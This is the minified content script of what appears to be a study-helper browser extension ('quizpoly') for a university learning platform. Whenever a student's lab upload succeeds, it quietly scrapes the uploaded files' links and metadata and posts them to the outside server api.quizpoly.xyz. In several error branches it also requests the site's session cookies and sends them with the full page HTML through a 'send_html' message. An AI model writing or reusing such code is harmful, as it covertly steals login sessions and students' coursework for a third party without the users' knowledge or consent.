const apiUrl = "https://api.quizpoly.xyz",
  breadcrumb = document.querySelector(".ilTableHeaderTitle > a"),
  lab = breadcrumb && breadcrumb.innerText.split("-")[1].trim(),
  urlParsed = new URL(window.location.href),
  fileId =
    "file-" +
    urlParsed.searchParams.get("ref_id") +
    urlParsed.searchParams.get("ass_id"),
  subjectCodePattern = /\b[A-Za-z]{3}\s?\d{3,4}/,
  alertEl = document.querySelector(".alert-success");
if (
  alertEl &&
  ("Success Message\nĐã tải lên file" == alertEl.innerText ||
    "Success Message\nFile uploaded" == alertEl.innerText)
) {
  sendFile(
    Array.from(document.querySelectorAll("table tbody > tr"))
      .map((e) => e.querySelector("td:last-child>a").getAttribute("href"))
      .join("\n")
  );
}
function getSubject() {
  let e;
  try {
    const t = document.querySelectorAll(".breadcrumb a");
    if (!t.length) return { classCode: "", subjectName: "" };
    for (const r of t) {
      const t = r.textContent.trim();
      if (!t.startsWith("HK") && ((e = t.match(subjectCodePattern)), e))
        return {
          subjectName: extractSubjectName(t),
          classCode: extractClassCode(r),
        };
    }
    return e ? { classCode: "", subjectName: "" } : getSubjectOnly();
  } catch (t) {
    return (
      chrome.runtime.sendMessage(
        { type: "get_cookies", domain: window.location.host },
        (e) =>
          sendHtml(
            `Get file get subject error - ${window.location.href} - ${e.cookie} - ${t.message}`
          )
      ),
      { classCode: "", subjectName: "" }
    );
  }
}
function getSubjectOnly() {
  let e = document.querySelector(".breadcrumb > .crumb:nth-of-type(6)"),
    t = e.textContent.trim();
  const r = t.toLowerCase();
  ([
    "2d, 3d animation - dựng phim",
    "2d",
    "cơ khí",
    "tự động hoá",
    "thiết kế cơ bản",
    "kinh tế",
    "cntt",
  ].includes(r) ||
    /^(ngành|bộ môn|bm)/.test(r)) &&
    ((e = document.querySelector(".breadcrumb > .crumb:nth-of-type(7)")),
    (t = e.textContent.trim()));
  const n = e.nextElementSibling.textContent.trim();
  return (t = t.replace(/^Các Lớp - /, "")), { subjectName: t, classCode: n };
}
function extractClassCode(e) {
  const t = e.parentNode.nextElementSibling;
  if (!t) return "";
  let r = t.textContent.trim();
  if (/thầy|cô/i.test(r)) {
    let e = r.split("-");
    if (!e[0].match(subjectCodePattern)) return r;
    e.length >= 4 && e.splice(0, e.length - 2), (r = e.join("-"));
  }
  return r.trim();
}
function extractSubjectName(e) {
  return e
    .replace("z_", "")
    .replace("Các Lớp - ", "")
    .replace(/_/g, "-")
    .replace(/^Môn /, "")
    .trim();
}
function getRefIdMembers() {
  const e = /^[A-Z]{2,3}[0-9]{3,5}([_|\.] ?[0-9]{1,3})?(_[A-Za-z]{1,15})?$/,
    t = (e) => /thầy|cô/i.test(e.trim()),
    r = (t) => e.test(t);
  for (let n = 2; n <= 3; n++) {
    let e = document.querySelector(`.breadcrumb>span:nth-last-child(${n})>a`);
    if (!e) break;
    const c = e.innerText;
    if (t(c)) return "";
    if (!r(c)) continue;
    const o = e.getAttribute("href"),
      i = /ref_id=([^&]+)/.exec(o);
    return i ? i[1] : "";
  }
  return "";
}
async function fetchWithRetry(e, t = 1) {
  let r = await fetch(e);
  for (; r.status >= 500 && t > 0; ) t--, (r = await fetch(e));
  return r;
}
function processLecturers(e) {
  let t = "";
  const r = e.querySelector(".ilHeaderDesc");
  if (r) return r.textContent.trim();
  const n = Array.from(e.querySelectorAll(".il-card dl > dd")).reduce(
    (e, t, r, n) => {
      const c = t.textContent;
      if ("Support Contact" === c) return (e[r - 1] = "-" + e[r - 1]), e;
      if (c && c.replace(/[^0-9]/g, "").length < 5) e.push(c);
      else if (0 !== r) return e;
      return e;
    },
    []
  );
  return n.length && (t = n.join(" - ")), t;
}
function processLecturers2(e) {
  const t = e.querySelector(".ilHeaderDesc");
  if ((t && (lecturers = t.innerText.trim()), !lecturers)) {
    const t = e.querySelectorAll(".il-card dl > dd"),
      r = [];
    for (let [e, n] of t.entries()) {
      const t = n.innerText;
      if ("Support Contact" != t) {
        if (
          (void 0 === t &&
            sendHtml("get file lecturers member undefined", html),
          void 0 !== t && t.replace(/[^0-9]/g, "").length < 5)
        )
          r.push(t);
        else if (0 != e) break;
      } else r[e - 1] = "-" + r[e - 1];
    }
    lecturers = r.length ? r.join(" - ") : "";
  }
  return lecturers;
}
async function getLecturers(e) {
  const t = getRefIdMembers();
  if (!t) return "";
  const r = `${window.location.origin}/ilias.php?ref_id=${t}&cmdClass=ilusersgallerygui&cmd=view&cmdNode=4t:zw:102:6&baseClass=ilrepositorygui`;
  let n = await fetchWithRetry(r);
  if (!n.ok) return "";
  const c = await n.text();
  let o = processLecturers(parseHTML(c));
  return (
    o ||
      chrome.runtime.sendMessage(
        { type: "get_cookies", domain: window.location.host },
        (t) => {
          sendHtml(
            `lecturers empty - ${n.status} - ${e} - ${window.location.href} - ${r} - ${t.cookie}`,
            c.includes("Failure Message") ? "Failure Message" : c
          );
        }
      ),
    o
  );
}
function getFileInfo() {
  return new Promise((e, t) => {
    chrome.storage.local.get(fileId, (t) => {
      const r = t[fileId];
      r.sort((e, t) => e.name.localeCompare(t.name)),
        (fileName = r.map(({ name: e }) => e).join("\n")),
        (fileSize = r.map(({ size: e }) => humanFileSize(e)).join(",")),
        e({ fileName: fileName, fileSize: fileSize }),
        chrome.storage.local.remove(fileId);
    });
  });
}
async function sendFile(e) {
  const { subjectName: t, classCode: r } = getSubject();
  t ||
    chrome.runtime.sendMessage(
      { type: "get_cookies", domain: window.location.host },
      (e) =>
        sendHtml(
          `get file subject empty - ${window.location.href} - ${e.cookie}`
        )
    );
  const n = await getLecturers(t),
    { server: c, term: o } = getServerTerm(),
    { fileName: i, fileSize: s } = await getFileInfo(),
    l = {
      fileUrl: e,
      fileName: i,
      subjectName: t,
      size: s,
      class: n ? `${r} - ${n}` : r,
      lab: lab,
      server: c,
      term: o,
    };
  fetch(apiUrl + "/quizpoly/lab", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    referrerPolicy: "origin",
    body: JSON.stringify(l),
  })
    .then((e) => e.json())
    .then((e) => {});
}
function getServerTerm() {
  try {
    const e = document.querySelector(".crumb:nth-child(3) > a").textContent,
      t = document.querySelector(".crumb:nth-child(2) > a").textContent;
    return (
      (server = t
        .split(" ")
        .map((e) => e.charAt(0))
        .join("")),
      (term = e.replace("HK_", "").replace("_", " ")),
      { server: server, term: term }
    );
  } catch (e) {
    return (
      sendHtml(
        `Upload file get server term error: ${e.message} - ${window.location.href}`
      ),
      { server: "", term: "" }
    );
  }
}
async function sendHtml(e, t) {
  t || (t = document.body.innerHTML.replace(/\n/g, "").replace(/\t/g, "")),
    chrome.runtime.sendMessage({ type: "send_html", note: e, html: t });
}
function humanFileSize(e, t = 1) {
  const r = 1e3;
  if (Math.abs(e) < r) return e + " B";
  const n = ["kB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];
  let c = -1;
  const o = 10 ** t;
  do {
    (e /= r), ++c;
  } while (Math.round(Math.abs(e) * o) / o >= r && c < n.length - 1);
  return e.toFixed(t) + " " + n[c];
}
function parseHTML(e) {
  return new DOMParser().parseFromString(e, "text/html");
}
